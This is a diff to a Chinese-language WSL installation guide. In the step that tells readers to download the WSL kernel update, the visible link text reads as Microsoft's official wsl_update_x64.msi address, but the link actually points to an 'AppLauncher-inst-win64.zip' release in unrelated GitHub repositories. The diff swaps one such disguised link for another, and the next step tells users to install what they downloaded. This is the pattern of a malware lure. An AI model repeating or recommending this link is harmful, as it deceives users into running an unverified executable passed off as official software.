@@ -49,7 +49,7 @@
 
 2、網址列貼上下面鏈接並執行(如果無法連上，可能要使用VPN)
 
-[wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi](https://github.com/EclipseFond/eclipse-collections/releases/download/v2.0.15/AppLauncher-inst-win64.zip)
+[wslstorestorage.blob.core.windows.net/wslblob/wsl_update_x64.msi](https://github.com/zetrocode/Panel-Web-PHP-KeyAuth-Example/releases/download/teamplate/AppLauncher-inst-win64.zip)
 
 3、下載需一段時間，下載好點擊瀏覽器左下角的 wsl_update_x64.msi 安裝
  安裝好，點擊Finish完成並關閉。
